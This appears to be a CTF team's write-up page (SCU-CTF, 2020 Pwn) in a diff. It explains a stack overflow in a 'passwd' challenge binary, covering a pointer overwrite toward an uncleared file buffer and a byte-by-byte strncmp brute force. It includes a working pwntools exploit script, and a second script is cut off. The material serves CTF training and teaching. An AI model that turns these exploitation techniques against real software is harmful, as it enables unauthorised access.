@@ -1,0 +1,1333 @@
+
+
+
+
+<!doctype html>
+<html lang="zh" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      <meta http-equiv="x-ua-compatible" content="ie=edge">
+      
+      
+      
+      
+        <meta name="lang:clipboard.copy" content="复制">
+      
+        <meta name="lang:clipboard.copied" content="已复制">
+      
+        <meta name="lang:search.language" content="jp">
+      
+        <meta name="lang:search.pipeline.stopwords" content="True">
+      
+        <meta name="lang:search.pipeline.trimmer" content="True">
+      
+        <meta name="lang:search.result.none" content="没有找到符合条件的结果">
+      
+        <meta name="lang:search.result.one" content="找到 1 个符合条件的结果">
+      
+        <meta name="lang:search.result.other" content="# 个符合条件的结果">
+      
+        <meta name="lang:search.tokenizer" content="[\uff0c\u3002]+">
+      
+      <link rel="shortcut icon" href="../../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.0.4, mkdocs-material-4.1.0">
+    
+    
+      
+        <title>Pwn - SCU-CTF HomePage</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../assets/stylesheets/application.982221ab.css">
+      
+        <link rel="stylesheet" href="../../../assets/stylesheets/application-palette.224b79ff.css">
+      
+      
+        
+        
+        <meta name="theme-color" content="">
+      
+    
+    
+      <script src="../../../assets/javascripts/modernizr.01ccdecf.js"></script>
+    
+    
+      
+        <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Noto+Sans:300,400,400i,700|Source+Code+Pro">
+        <style>body,input{font-family:"Noto Sans","Helvetica Neue",Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Source Code Pro","Courier New",Courier,monospace}</style>
+      
+    
+    <link rel="stylesheet" href="../../../assets/fonts/material-icons.css">
+    
+    
+      <link rel="stylesheet" href="../../../_static/css/extra.css">
+    
+    
+      
+    
+    
+  </head>
+  
+    
+    
+    <body dir="ltr" data-md-color-primary="white" data-md-color-accent="red">
+  
+    <svg class="md-svg">
+      <defs>
+        
+        
+          <svg xmlns="http://www.w3.org/2000/svg" width="416" height="448"
+    viewBox="0 0 416 448" id="__github">
+  <path fill="currentColor" d="M160 304q0 10-3.125 20.5t-10.75 19-18.125
+        8.5-18.125-8.5-10.75-19-3.125-20.5 3.125-20.5 10.75-19 18.125-8.5
+        18.125 8.5 10.75 19 3.125 20.5zM320 304q0 10-3.125 20.5t-10.75
+        19-18.125 8.5-18.125-8.5-10.75-19-3.125-20.5 3.125-20.5 10.75-19
+        18.125-8.5 18.125 8.5 10.75 19 3.125 20.5zM360
+        304q0-30-17.25-51t-46.75-21q-10.25 0-48.75 5.25-17.75 2.75-39.25
+        2.75t-39.25-2.75q-38-5.25-48.75-5.25-29.5 0-46.75 21t-17.25 51q0 22 8
+        38.375t20.25 25.75 30.5 15 35 7.375 37.25 1.75h42q20.5 0
+        37.25-1.75t35-7.375 30.5-15 20.25-25.75 8-38.375zM416 260q0 51.75-15.25
+        82.75-9.5 19.25-26.375 33.25t-35.25 21.5-42.5 11.875-42.875 5.5-41.75
+        1.125q-19.5 0-35.5-0.75t-36.875-3.125-38.125-7.5-34.25-12.875-30.25-20.25-21.5-28.75q-15.5-30.75-15.5-82.75
+        0-59.25 34-99-6.75-20.5-6.75-42.5 0-29 12.75-54.5 27 0 47.5 9.875t47.25
+        30.875q36.75-8.75 77.25-8.75 37 0 70 8 26.25-20.5
+        46.75-30.25t47.25-9.75q12.75 25.5 12.75 54.5 0 21.75-6.75 42 34 40 34
+        99.5z" />
+</svg>
+        
+      </defs>
+    </svg>
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" data-md-component="overlay" for="__drawer"></label>
+    
+      <a href="#pwn" tabindex="1" class="md-skip">
+        跳转至
+      </a>
+    
+    
+      <header class="md-header" data-md-component="header">
+  <nav class="md-header-nav md-grid">
+    <div class="md-flex">
+      <div class="md-flex__cell md-flex__cell--shrink">
+        <a href="../../.." title="SCU-CTF HomePage" class="md-header-nav__button md-logo">
+          
+            <i class="md-icon">school</i>
+          
+        </a>
+      </div>
+      <div class="md-flex__cell md-flex__cell--shrink">
+        <label class="md-icon md-icon--menu md-header-nav__button" for="__drawer"></label>
+      </div>
+      <div class="md-flex__cell md-flex__cell--stretch">
+        <div class="md-flex__ellipsis md-header-nav__title" data-md-component="title">
+          
+            <span class="md-header-nav__topic">
+              SCU-CTF HomePage
+            </span>
+            <span class="md-header-nav__topic">
+              Pwn
+            </span>
+          
+        </div>
+      </div>
+      <div class="md-flex__cell md-flex__cell--shrink">
+        
+          <label class="md-icon md-icon--search md-header-nav__button" for="__search"></label>
+          
+<div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" placeholder="搜索" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="query" data-md-state="active">
+      <label class="md-icon md-search__icon" for="__search"></label>
+      <button type="reset" class="md-icon md-search__icon" data-md-component="reset" tabindex="-1">
+        &#xE5CD;
+      </button>
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="result">
+          <div class="md-search-result__meta">
+            键入以开始搜索
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+        
+      </div>
+      
+        <div class="md-flex__cell md-flex__cell--shrink">
+          <div class="md-header-nav__source">
+            
+
+
+  
+
+<a href="https://github.com/scu-ctf/scu-ctf.github.io/" title="前往 Github 仓库" class="md-source" data-md-source="github">
+  
+    <div class="md-source__icon">
+      <svg viewBox="0 0 24 24" width="24" height="24">
+        <use xlink:href="#__github" width="24" height="24"></use>
+      </svg>
+    </div>
+  
+  <div class="md-source__repository">
+    GitHub
+  </div>
+</a>
+          </div>
+        </div>
+      
+    </div>
+  </nav>
+</header>
+    
+    <div class="md-container">
+      
+        
+      
+      
+        
+
+  
+
+<nav class="md-tabs md-tabs--active" data-md-component="tabs">
+  <div class="md-tabs__inner md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  <li class="md-tabs__item">
+    
+      <a href="../../.." title="Introduction" class="md-tabs__link">
+        Introduction
+      </a>
+    
+  </li>
+
+      
+        
+  
+  
+    <li class="md-tabs__item">
+      
+        <a href="../../../0X401-Wiki/" title="0X401 Wiki" class="md-tabs__link">
+          0X401 Wiki
+        </a>
+      
+    </li>
+  
+
+      
+        
+  
+  
+    
+    
+  
+  
+    <li class="md-tabs__item">
+      
+        <a href="../../2018/Web/" title="WriteUp" class="md-tabs__link">
+          WriteUp
+        </a>
+      
+    </li>
+  
+
+  
+
+      
+        
+  
+  
+    <li class="md-tabs__item">
+      
+        <a href="../../../比赛信息/" title="比赛信息" class="md-tabs__link">
+          比赛信息
+        </a>
+      
+    </li>
+  
+
+      
+    </ul>
+  </div>
+</nav>
+      
+      <main class="md-main">
+        <div class="md-main__inner md-grid" data-md-component="container">
+          
+            
+              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    <nav class="md-nav md-nav--primary" data-md-level="0">
+  <label class="md-nav__title md-nav__title--site" for="__drawer">
+    <a href="../../.." title="SCU-CTF HomePage" class="md-nav__button md-logo">
+      
+        <i class="md-icon">school</i>
+      
+    </a>
+    SCU-CTF HomePage
+  </label>
+  
+    <div class="md-nav__source">
+      
+
+
+  
+
+<a href="https://github.com/scu-ctf/scu-ctf.github.io/" title="前往 Github 仓库" class="md-source" data-md-source="github">
+  
+    <div class="md-source__icon">
+      <svg viewBox="0 0 24 24" width="24" height="24">
+        <use xlink:href="#__github" width="24" height="24"></use>
+      </svg>
+    </div>
+  
+  <div class="md-source__repository">
+    GitHub
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+
+  <li class="md-nav__item">
+    <a href="../../.." title="Introduction" class="md-nav__link">
+      Introduction
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2" type="checkbox" id="nav-2">
+    
+    <label class="md-nav__link" for="nav-2">
+      0X401 Wiki
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-2">
+        0X401 Wiki
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../0X401-Wiki/" title="0X401-Wiki" class="md-nav__link">
+      0X401-Wiki
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-2" type="checkbox" id="nav-2-2">
+    
+    <label class="md-nav__link" for="nav-2-2">
+      Web
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-2-2">
+        Web
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../0X401-Wiki/Web/Web/" title="Web" class="md-nav__link">
+      Web
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-2-2" type="checkbox" id="nav-2-2-2">
+    
+    <label class="md-nav__link" for="nav-2-2-2">
+      Java
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
+      <label class="md-nav__title" for="nav-2-2-2">
+        Java
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../0X401-Wiki/Web/java/" title="Index" class="md-nav__link">
+      Index
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-2-3" type="checkbox" id="nav-2-2-3">
+    
+    <label class="md-nav__link" for="nav-2-2-3">
+      Nodejs
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
+      <label class="md-nav__title" for="nav-2-2-3">
+        Nodejs
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../0X401-Wiki/Web/nodejs/" title="Index" class="md-nav__link">
+      Index
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-2-4" type="checkbox" id="nav-2-2-4">
+    
+    <label class="md-nav__link" for="nav-2-2-4">
+      Php
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
+      <label class="md-nav__title" for="nav-2-2-4">
+        Php
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../0X401-Wiki/Web/php/" title="Index" class="md-nav__link">
+      Index
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-2-5" type="checkbox" id="nav-2-2-5">
+    
+    <label class="md-nav__link" for="nav-2-2-5">
+      Python
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
+      <label class="md-nav__title" for="nav-2-2-5">
+        Python
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../0X401-Wiki/Web/python/" title="Index" class="md-nav__link">
+      Index
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3" type="checkbox" id="nav-3" checked>
+    
+    <label class="md-nav__link" for="nav-3">
+      WriteUp
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-3">
+        WriteUp
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-1" type="checkbox" id="nav-3-1">
+    
+    <label class="md-nav__link" for="nav-3-1">
+      2018
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-3-1">
+        2018
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../2018/Web/" title="Web" class="md-nav__link">
+      Web
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-2" type="checkbox" id="nav-3-2">
+    
+    <label class="md-nav__link" for="nav-3-2">
+      201905
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-3-2">
+        201905
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../201905/Crypto/" title="Crypto" class="md-nav__link">
+      Crypto
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../201905/Misc/" title="MISC" class="md-nav__link">
+      MISC
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../201905/Pwn/" title="PWN" class="md-nav__link">
+      PWN
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../201905/Reverse/" title="REVERSE" class="md-nav__link">
+      REVERSE
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../201905/Web/" title="Web" class="md-nav__link">
+      Web
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-3" type="checkbox" id="nav-3-3" checked>
+    
+    <label class="md-nav__link" for="nav-3-3">
+      202005
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-3-3">
+        202005
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Misc/" title="Misc" class="md-nav__link">
+      Misc
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Reverse/" title="Reverse" class="md-nav__link">
+      Reverse
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Web/" title="Web" class="md-nav__link">
+      Web
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active">
+    
+    <input class="md-toggle md-nav__toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+    
+      
+    
+    
+      <label class="md-nav__link md-nav__link--active" for="__toc">
+        Pwn
+      </label>
+    
+    <a href="./" title="Pwn" class="md-nav__link md-nav__link--active">
+      Pwn
+    </a>
+    
+      
+<nav class="md-nav md-nav--secondary">
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">目录</label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#passwd" title="Passwd（简单的栈溢出，有两种思路可以利用）" class="md-nav__link">
+    Passwd（简单的栈溢出，有两种思路可以利用）
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_1" title="解题思路一" class="md-nav__link">
+    解题思路一
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_2" title="最终结果" class="md-nav__link">
+    最终结果
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exp" title="exp" class="md-nav__link">
+    exp
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_3" title="解题思路二" class="md-nav__link">
+    解题思路二
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_4" title="前置知识" class="md-nav__link">
+    前置知识
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_5" title="解体思路" class="md-nav__link">
+    解体思路
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exp_1" title="exp" class="md-nav__link">
+    exp
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#kernel_rop" title="Kernel_rop（简单的内核栈溢出）" class="md-nav__link">
+    Kernel_rop（简单的内核栈溢出）
+  </a>
+  
+</li>
+      
+      
+      
+      
+      
+        <li class="md-nav__item">
+          <a href="#__comments" title="评论" class="md-nav__link md-nav__link--active">
+            评论
+          </a>
+        </li>
+      
+    </ul>
+  
+</nav>
+    
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-4" type="checkbox" id="nav-4">
+    
+    <label class="md-nav__link" for="nav-4">
+      比赛信息
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-4">
+        比赛信息
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../比赛信息/" title="比赛信息发布" class="md-nav__link">
+      比赛信息发布
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+<nav class="md-nav md-nav--secondary">
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">目录</label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#passwd" title="Passwd（简单的栈溢出，有两种思路可以利用）" class="md-nav__link">
+    Passwd（简单的栈溢出，有两种思路可以利用）
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_1" title="解题思路一" class="md-nav__link">
+    解题思路一
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_2" title="最终结果" class="md-nav__link">
+    最终结果
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exp" title="exp" class="md-nav__link">
+    exp
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_3" title="解题思路二" class="md-nav__link">
+    解题思路二
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_4" title="前置知识" class="md-nav__link">
+    前置知识
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_5" title="解体思路" class="md-nav__link">
+    解体思路
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exp_1" title="exp" class="md-nav__link">
+    exp
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#kernel_rop" title="Kernel_rop（简单的内核栈溢出）" class="md-nav__link">
+    Kernel_rop（简单的内核栈溢出）
+  </a>
+  
+</li>
+      
+      
+      
+      
+      
+        <li class="md-nav__item">
+          <a href="#__comments" title="评论" class="md-nav__link md-nav__link--active">
+            评论
+          </a>
+        </li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          <div class="md-content">
+            <article class="md-content__inner md-typeset">
+              
+                
+                  <a href="https://github.com/scu-ctf/scu-ctf.github.io/edit/master/docs/WriteUp/202005/pwn.md" title="编辑此页" class="md-icon md-content__icon">&#xE3C9;</a>
+                
+                
+                <h1 id="pwn">Pwn<a class="headerlink" href="#pwn" title="Permanent link">&para;</a></h1>
+<h2 id="passwd">Passwd（简单的栈溢出，有两种思路可以利用）<a class="headerlink" href="#passwd" title="Permanent link">&para;</a></h2>
+<h3 id="_1">解题思路一<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h3>
+<blockquote>
+<p>文件读取结束后，相关的缓冲区数据会被清空吗? 不会吧，不会吧</p>
+</blockquote>
+<p>(直接拿郭子仪同学的wp放上来了)</p>
+<p>首先nop掉反调试, 恢复结构体   </p>
+<p><img alt="struct" src="../assert/struct.png" /></p>
+<p>其中passwd指向我们读入的数据。
+然后函数名字也rename一下。</p>
+<p><img alt="fun" src="../assert/fun.png" /></p>
+<p>然后看一下这个程序实际上在读取的时候可以将name溢出到passwd来修改passwd指针。</p>
+<p><img alt="vul" src="../assert/vul.png" /></p>
+<p>程序使用fopen读取真正的密码，而文件读取结束后相关缓冲区的并不会被清空。所以直接覆盖passwd指针到缓冲区即可。不过要稍微爆破一下。（一开始想复杂了，准备对着mmap一通操作，打freehook）。脚本其实不难，一开始确实想偏了。</p>
+<h4 id="_2">最终结果<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h4>
+<p><img alt="res" src="../assert/res.png" /></p>
+<h4 id="exp">exp<a class="headerlink" href="#exp" title="Permanent link">&para;</a></h4>
+<div class="codehilite"><pre><span></span><span class="c1"># encoding=UTF-8</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">context</span><span class="o">.</span><span class="n">terminal</span><span class="o">=</span><span class="s1">&#39;/bin/zsh&#39;</span>
+<span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s2">&quot;amd64&quot;</span>
+<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s2">&quot;debug&quot;</span>
+<span class="n">elf_path</span> <span class="o">=</span> <span class="s2">&quot;./passwd&quot;</span>
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">elf_path</span><span class="p">)</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;./libc-2.23.so&quot;</span><span class="p">)</span>
+<span class="n">ip</span> <span class="o">=</span> <span class="s2">&quot;www.povcfe.site&quot;</span>
+<span class="n">port</span> <span class="o">=</span> <span class="mi">10001</span>
+<span class="c1">#io = remote(ip, port)</span>
+<span class="c1">#io = process(elf_path)</span>
+
+<span class="k">def</span> <span class="nf">input_name</span><span class="p">(</span><span class="n">buf</span><span class="p">):</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&quot;Name:&quot;</span><span class="p">,</span> <span class="n">buf</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">input_size</span><span class="p">(</span><span class="n">size</span><span class="p">):</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&quot;Length Of New Passwd:&quot;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">input_passwd</span><span class="p">(</span><span class="n">buf</span><span class="p">):</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&quot;Passwd:&quot;</span><span class="p">,</span> <span class="n">buf</span><span class="p">)</span>
+
+<span class="n">yes</span> <span class="o">=</span> <span class="s2">&quot;yes&quot;</span>
+<span class="n">no</span> <span class="o">=</span> <span class="s2">&quot;no&quot;</span>
+<span class="k">def</span> <span class="nf">yes_no</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&quot;yes/no?:&quot;</span><span class="p">,</span> <span class="n">s</span><span class="p">)</span>
+
+<span class="n">sw</span> <span class="o">=</span> <span class="s2">&quot;1&quot;</span>
+<span class="n">ac</span> <span class="o">=</span> <span class="s2">&quot;2&quot;</span>
+<span class="k">def</span> <span class="nf">choice</span><span class="p">(</span><span class="n">c</span><span class="p">):</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&quot;[2]:Start A New Article&quot;</span><span class="p">,</span> <span class="n">c</span><span class="p">)</span>
+
+
+<span class="k">def</span> <span class="nf">input_ac</span><span class="p">(</span><span class="n">buf</span><span class="p">):</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&quot;Article(end with &#39;#&#39;):&quot;</span><span class="p">,</span> <span class="n">buf</span><span class="p">)</span>
+
+<span class="k">while</span> <span class="mi">1</span><span class="p">:</span>
+    <span class="c1">#io = remote(ip, port)</span>
+
+    <span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">elf_path</span><span class="p">)</span>
+    <span class="n">input_name</span><span class="p">(</span><span class="s2">&quot;abcd&quot;</span><span class="p">)</span>
+    <span class="n">input_size</span><span class="p">(</span><span class="mi">24</span><span class="p">)</span>
+    <span class="n">input_passwd</span><span class="p">(</span><span class="s2">&quot;123456&quot;</span><span class="p">)</span>
+    <span class="n">choice</span><span class="p">(</span><span class="n">sw</span><span class="p">)</span>
+    <span class="n">yes_no</span><span class="p">(</span><span class="n">yes</span><span class="p">)</span>
+
+    <span class="n">buf</span> <span class="o">=</span> <span class="s2">&quot;admin&quot;</span>
+    <span class="n">buf</span> <span class="o">+=</span> <span class="s2">&quot;</span><span class="se">\x00</span><span class="s2">&quot;</span><span class="o">*</span><span class="mh">0xb</span>   <span class="c1"># 填充至name结束，16个</span>
+    <span class="n">buf</span> <span class="o">+=</span> <span class="s2">&quot;</span><span class="se">\xa0\xd2</span><span class="s2">&quot;</span>   <span class="c1"># 开始覆盖passwd指针的低位</span>
+    <span class="n">input_name</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
+    <span class="c1"># pause()</span>
+    <span class="c1"># attach(io)</span>
+    <span class="n">buf</span> <span class="o">=</span> <span class="s2">&quot;a&quot;</span><span class="o">*</span><span class="mh">0x14</span>
+    <span class="n">input_passwd</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
+    <span class="n">pause</span><span class="p">()</span>
+    <span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">)</span>
+
+    <span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</pre></div>
+
+<p><strong>郭子仪同学一开始陷入误区的原因是认为mmap基地址与libc基地址偏移固定，其实两者的偏移在不同系统上有可能是不同的。换个思路，因为mmap与libc之间一定是以0x1000为基础进行偏移的，所以在这里可以适度爆破mmap与libc之间的固定偏移，那么这题也是可以做出来的</strong></p>
+<h3 id="_3">解题思路二<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h3>
+<blockquote>
+<p>考虑一下strncmp函数是怎么判断字符串相等的?</p>
+</blockquote>
+<h4 id="_4">前置知识<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h4>
+<p>strncmp(str1, str2, n) 的实现原理，是通过逐字节比对直至n字节全部比对完毕，中间如果发现某字节不同，则函数返回。所以，假设str1[0]存储于合法地址，但是str1[1]存储于非法地址(无读取权限的地址)，那么如果在比对第一个字节时，str1与str2不同则正常函数返回，反之如果第一个字节相同，函数继续执行并读取第二个字节(str[1]存储于非法地址)，则程序异常退出。</p>
+<h4 id="_5">解体思路<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h4>
+<p>通过溢出可以控制passwd指向的地址，并且程序中存在由mmap开辟的固定内存块0x600000000000-0x600000004000，所以如果把passwd指向0x600000004000-1，那么根据程序的返回状态就可以判断第一个字节是否正确，根据这个方法可以把passwd逐字节爆破</p>
+<h4 id="exp_1">exp<a class="headerlink" href="#exp_1" title="Permanent link">&para;</a></h4>
+<div class="codehilite"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">time</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+
+<span class="c1"># sh = process(&quot;./passwd&quot;)</span>
+<span class="c1"># ip = sys.argv[1]</span>
